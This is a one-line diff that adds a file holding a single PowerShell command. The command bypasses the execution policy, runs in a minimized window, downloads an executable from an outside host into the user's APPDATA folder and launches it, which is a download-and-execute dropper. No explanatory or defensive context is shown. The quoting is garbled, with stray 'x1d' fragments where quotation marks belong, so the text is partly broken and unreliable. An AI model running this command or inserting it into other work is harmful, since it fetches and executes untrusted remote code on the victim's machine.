@@ -1,0 +1,1 @@
+PowerShell -ExecutionPolicy bypass -noprofile -windowstyle minimized -command (New-Object System.Net.WebClient).DownloadFile('https://a.vidga.me/thgohw.exe',x1d $env:APPDATAExample.exex1d );Start-Process (x1d $env:APPDATAExample.exex1d )
